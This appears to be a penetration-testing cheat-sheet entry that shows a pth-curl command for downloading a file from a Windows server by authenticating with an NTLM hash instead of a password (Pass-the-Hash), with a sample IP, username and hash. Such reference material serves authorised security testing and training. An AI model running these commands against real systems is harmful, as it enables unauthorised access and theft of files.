---
description: Download files from a remote server using curl with NTLM Pass-the-Hash authentication.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  pth-curl --ntlm -u john:580B16D486D8D2CAFA00B314D41FA396 http://10.10.10.1/secret.txt

items:
  - Hash

services:
  - NTLM

OS:
  - Windows

attack_types:
  - Enumeration

references:
  - https://curl.se/docs/manual.html
  - https://github.com/byt3bl33d3r/pth-toolkit
---
